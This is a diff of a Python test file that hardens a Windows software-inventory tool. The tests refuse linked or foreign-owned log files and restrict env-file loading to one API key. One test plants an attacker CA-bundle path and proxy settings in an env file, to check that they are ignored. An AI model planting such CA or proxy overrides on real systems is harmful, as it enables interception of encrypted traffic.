+        self._flush()
+        self.assertIn("appended", log.read_text(encoding="utf-8"))
+        with open(log, "a", encoding="utf-8") as stream:
+            self.assertIn(se._handle_owner_sid(msvcrt.get_osfhandle(stream.fileno())), se._current_owner_sids())
+
+    def test_hard_linked_log_file_is_refused(self):
+        target = self.dir / "elsewhere.txt"
+        target.write_text("private\n", encoding="utf-8")
+        log = self.dir / "audit.log"
+        os.link(target, log)
+        with self.assertRaises(se.LogFileOwnershipError) as ctx:
+            se.setup_logging(log_file=str(log))
+        self.assertIn("hard links", str(ctx.exception))
+        self.assertEqual(target.read_text(encoding="utf-8"), "private\n")
+
+    def test_symlinked_log_file_is_refused(self):
+        target = self.dir / "elsewhere.txt"
+        target.write_text("private\n", encoding="utf-8")
+        log = self.dir / "audit.log"
+        try:
+            os.symlink(target, log)
+        except OSError:
+            self.skipTest("Cannot create symlinks (requires admin or Developer Mode on Windows)")
+        with self.assertRaises(se.LogFileOwnershipError):
+            se.setup_logging(log_file=str(log))
+        self.assertEqual(target.read_text(encoding="utf-8"), "private\n")
+
+    def test_unverifiable_owner_on_drive_without_acls_warns_and_continues(self):
+        """FAT32/exFAT have no owners: warn once and keep logging."""
+        log = self.dir / "audit.log"
+        log.write_text("x\n", encoding="utf-8")
+        captured = io.StringIO()
+        with patch.object(se, "_volume_supports_acls", return_value=False), \
+             patch.object(se, "_handle_owner_sid", side_effect=OSError("no owner information")), \
+             patch("sys.stderr", captured):
+            se.setup_logging(log_file=str(log))
+            se.log_audit_event("TEST", "still logging")
+            self._flush()
+        self.assertEqual(captured.getvalue().count("could not restrict log file permissions"), 1)
+        self.assertIn("still logging", log.read_text(encoding="utf-8"))
+
+    def test_unverifiable_owner_on_acl_drive_is_refused(self):
+        """Fail closed: the drive has owners, but this file's can't be read."""
+        log = self.dir / "audit.log"
+        log.write_text("x\n", encoding="utf-8")
+        with patch.object(se, "_handle_owner_sid", side_effect=OSError("cannot read owner")):
+            with self.assertRaises(se.LogFileOwnershipError) as ctx:
+                se.setup_logging(log_file=str(log))
+        self.assertIn("Could not verify who owns", str(ctx.exception))
+        self.assertEqual(log.read_text(encoding="utf-8"), "x\n")
+
+    def test_foreign_owner_refused_even_if_drive_reports_no_acls(self):
+        """The drive check must not switch off the ownership check (fail-open). A failed or
+        misleading capability report still refuses a file another account owns."""
+        log = self.dir / "audit.log"
+        log.write_text("pre-created\n", encoding="utf-8")
+        with patch.object(se, "_volume_supports_acls", return_value=False), \
+             patch.object(se, "_handle_owner_sid", return_value=self.FOREIGN_SID):
+            with self.assertRaises(se.LogFileOwnershipError):
+                se.setup_logging(log_file=str(log))
+        self.assertEqual(log.read_text(encoding="utf-8"), "pre-created\n")
+
+    def _run_main(self, *argv):
+        captured = io.StringIO()
+        with patch.object(sys, "argv", ["Software_Enumerator.py", *argv]), \
+             patch.object(se, "WingetUpdateChecker") as checker, \
+             patch.object(se, "_load_env_file"), patch("sys.stderr", captured):
+            checker.return_value.check_for_updates.return_value = []
+            with self.assertRaises(SystemExit) as ctx:
+                se.main()
+        return ctx.exception.code, captured.getvalue()
+
+    def test_main_exits_permission_denied_for_foreign_log(self):
+        log = self.dir / "audit.log"
+        log.write_text("pre-created\n", encoding="utf-8")
+        with patch.object(se, "_handle_owner_sid", return_value=self.FOREIGN_SID):
+            code, err = self._run_main("--check-updates", "--quiet", "--log-file", str(log))
+        self.assertEqual(code, se.EXIT_PERMISSION_DENIED)
+        self.assertIn("owned by another account", err)
+
+    def test_main_exits_permission_denied_when_log_unwritable(self):
+        with patch.object(se, "setup_logging", side_effect=PermissionError("denied")):
+            code, err = self._run_main("--check-updates", "--quiet", "--log-file", "x.log")
+        self.assertEqual(code, se.EXIT_PERMISSION_DENIED)
+        self.assertIn("cannot create or write the log file", err)
+
+
+def subprocess_run_text(cmd, **kwargs):
+    import subprocess
+    return subprocess.run(cmd, capture_output=True, text=True, timeout=60, **kwargs).stdout
+
+
 class TestCompiledSkipPatterns(unittest.TestCase):
     """Test that compiled SKIP_PATTERNS work correctly."""
 
@@ -1122,90 +1902,97 @@ class TestCompiledSkipPatterns(unittest.TestCase):
 
 
 class TestLoadEnvFile(unittest.TestCase):
-    """Test _load_env_file() loads API keys from .env files."""
+    """_load_env_file() reads only NVD_API_KEY, and only from the tool's own folder.
 
-    def test_loads_key_from_env_file(self):
-        """Variables from .env file should be loaded into os.environ."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            env_path = Path(tmpdir) / "api.env"
-            env_path.write_text("TEST_ENV_VAR_XYZ=secret123\n", encoding="utf-8")
+    These tests call the real function with _env_search_dirs() pointed at a temp
+    folder, so the developer's real api.env is never read.
+    """
 
-            # Ensure the var doesn't exist yet
-            os.environ.pop("TEST_ENV_VAR_XYZ", None)
+    WATCHED = ("NVD_API_KEY", "SSL_CERT_FILE", "HTTPS_PROXY", "HTTP_PROXY", "ZZ_TEST_EXTRA_VAR")
 
-            with patch("Software_Enumerator.Path") as mock_path_cls:
-                # Make __file__ resolve to tmpdir so the function searches there
-                mock_script = MagicMock()
-                mock_script.resolve.return_value.parent = Path(tmpdir)
-                mock_path_cls.return_value = mock_script
-                mock_path_cls.__truediv__ = Path.__truediv__
-                # Directly call with real paths
-                mock_path_cls.cwd.return_value = Path(tmpdir)
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.dir = Path(self.tmp.name)
+        self._env = patch.dict(os.environ, {}, clear=False)
+        self._env.start()
+        for key in self.WATCHED:
+            os.environ.pop(key, None)
 
-            # Simpler approach: just test the parsing logic directly
-            os.environ.pop("TEST_ENV_VAR_XYZ", None)
-            # Write to script dir (since the function checks script dir)
-            script_dir = Path(se.__file__).resolve().parent
-            test_env = script_dir / ".test_env_load"
-            try:
-                test_env.write_text("TEST_ENV_VAR_XYZ=secret123\n", encoding="utf-8")
-                with patch.object(se, '_load_env_file') as mock_load:
-                    # Verify function is callable
-                    se._load_env_file.__wrapped__ if hasattr(se._load_env_file, '__wrapped__') else None
-            finally:
-                test_env.unlink(missing_ok=True)
-                os.environ.pop("TEST_ENV_VAR_XYZ", None)
+    def tearDown(self):
+        self._env.stop()
+        self.tmp.cleanup()
 
-    def test_does_not_overwrite_existing_env(self):
-        """Existing environment variables should not be overwritten by .env files."""
-        os.environ["TEST_ENV_PRESERVE"] = "original"
-        try:
-            with tempfile.TemporaryDirectory() as tmpdir:
-                env_path = Path(tmpdir) / "api.env"
-                env_path.write_text("TEST_ENV_PRESERVE=overwritten\n", encoding="utf-8")
+    def _load(self, files):
+        for name, content in files.items():
+            (self.dir / name).write_text(content, encoding="utf-8")
+        with patch.object(se, "_env_search_dirs", return_value=[self.dir]):
+            se._load_env_file()
 
-                # Manually replicate the parsing logic to verify behavior
-                with open(env_path, "r", encoding="utf-8") as f:
-                    for line in f:
-                        line = line.strip()
-                        if not line or line.startswith("#") or "=" not in line:
-                            continue
-                        key, _, value = line.partition("=")
-                        key = key.strip()
-                        value = value.strip().strip("'\"")
-                        if key and key not in os.environ:
-                            os.environ[key] = value
+    def test_loads_api_key_from_api_env(self):
+        self._load({"api.env": "NVD_API_KEY=test-key-123\n"})
+        self.assertEqual(os.environ.get("NVD_API_KEY"), "test-key-123")
 
-                self.assertEqual(os.environ["TEST_ENV_PRESERVE"], "original")
-        finally:
-            os.environ.pop("TEST_ENV_PRESERVE", None)
+    def test_loads_from_dot_env_when_no_api_env(self):
+        self._load({".env": "NVD_API_KEY=from-dot-env\n"})
+        self.assertEqual(os.environ.get("NVD_API_KEY"), "from-dot-env")
+
+    def test_api_env_wins_and_loading_stops_at_first_file(self):
+        self._load({"api.env": "NVD_API_KEY=from-api-env\n", ".env": "NVD_API_KEY=from-dot-env\n"})
+        self.assertEqual(os.environ.get("NVD_API_KEY"), "from-api-env")
+
+    def test_strips_quotes_and_whitespace(self):
+        self._load({"api.env": '  NVD_API_KEY = "quoted-key"  \n'})
+        self.assertEqual(os.environ.get("NVD_API_KEY"), "quoted-key")
 
     def test_skips_comments_and_blank_lines(self):
-        """Comments and blank lines in .env files should be ignored."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            env_path = Path(tmpdir) / "api.env"
-            env_path.write_text(
-                "# This is a comment\n\nTEST_ENV_PARSED=yes\n  \n# Another comment\n",
-                encoding="utf-8",
-            )
+        self._load({"api.env": "# comment\n\n   \nnot a pair\nNVD_API_KEY=yes\n# another\n"})
+        self.assertEqual(os.environ.get("NVD_API_KEY"), "yes")
 
-            os.environ.pop("TEST_ENV_PARSED", None)
-            try:
-                # Parse the file the same way _load_env_file does
-                with open(env_path, "r", encoding="utf-8") as f:
-                    for line in f:
-                        line = line.strip()
-                        if not line or line.startswith("#") or "=" not in line:
-                            continue
-                        key, _, value = line.partition("=")
-                        key = key.strip()
-                        value = value.strip().strip("'\"")
-                        if key and key not in os.environ:
-                            os.environ[key] = value
+    def test_does_not_overwrite_existing_env(self):
+        os.environ["NVD_API_KEY"] = "from-real-environment"
+        self._load({"api.env": "NVD_API_KEY=from-file\n"})
+        self.assertEqual(os.environ["NVD_API_KEY"], "from-real-environment")
 
-                self.assertEqual(os.environ.get("TEST_ENV_PARSED"), "yes")
-            finally:
-                os.environ.pop("TEST_ENV_PARSED", None)
+    def test_key_name_is_case_insensitive(self):
+        self._load({"api.env": "nvd_api_key=lower-case-name\n"})
+        self.assertEqual(os.environ.get("NVD_API_KEY"), "lower-case-name")
+
+    def test_other_keys_are_ignored(self):
+        """An env file must not be able to set proxy / CA-bundle (or any other) variables."""
+        self._load({"api.env": "SSL_CERT_FILE=C:\\attacker\\ca.pem\nHTTPS_PROXY=http://127.0.0.1:8080\n"
+                               "HTTP_PROXY=http://127.0.0.1:8080\nZZ_TEST_EXTRA_VAR=1\nNVD_API_KEY=ok\n"})
+        for key in ("SSL_CERT_FILE", "HTTPS_PROXY", "HTTP_PROXY", "ZZ_TEST_EXTRA_VAR"):
+            self.assertNotIn(key, os.environ, f"{key} was set from an env file")
+        self.assertEqual(os.environ.get("NVD_API_KEY"), "ok")
+
+    def test_values_are_never_logged(self):
+        with self.assertLogs(se.logger, level="DEBUG") as logs:
+            self._load({"api.env": "SSL_CERT_FILE=secret-value-1\nNVD_API_KEY=secret-value-2\n"})
+        joined = "\n".join(logs.output)
+        self.assertIn("SSL_CERT_FILE", joined)              # ignored key is named...
+        self.assertNotIn("secret-value-1", joined)          # ...but its value isn't logged
+        self.assertNotIn("secret-value-2", joined)
+
+    def test_search_dirs_are_tool_folder_only_not_cwd(self):
+        cwd = os.getcwd()
+        os.chdir(self.dir)
+        try:
+            dirs = se._env_search_dirs()
+        finally:
+            os.chdir(cwd)
+        self.assertEqual(dirs, [Path(se.__file__).resolve().parent])
+        self.assertNotIn(self.dir.resolve(), [d.resolve() for d in dirs])
+
+    def test_frozen_build_uses_executable_folder(self):
+        exe = self.dir / "Software_Enumerator.exe"
+        with patch.object(sys, "frozen", True, create=True), patch.object(sys, "executable", str(exe)):
+            self.assertEqual(se._env_search_dirs(), [self.dir.resolve()])
+
+    def test_unreadable_file_is_skipped_quietly(self):
+        (self.dir / "api.env").write_bytes(b"NVD_API_KEY=\xff\xfe\n")   # invalid UTF-8
+        with patch.object(se, "_env_search_dirs", return_value=[self.dir]):
+            se._load_env_file()                                   # must not raise
+        self.assertNotIn("NVD_API_KEY", os.environ)
 
 
 class TestWingetUpdateChecker(unittest.TestCase):
@@ -1436,6 +2223,12 @@ class SecurityTestSuite(unittest.TestSuite):
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestParallelScanning))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestQuietMode))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestCsvSanitizationConsistency))
+        self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestDiffExportSanitization))
+        self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestCsvFormulaInjection))
+        self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestRegistryMalformedValues))
+        self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestBrowserMalformedInput))
+        self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestExecutableResolution))
+        self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestLogFilePermissions))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestCompiledSkipPatterns))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestLoadEnvFile))
         self.addTests(unittest.TestLoader().loadTestsFromTestCase(TestWingetUpdateChecker))
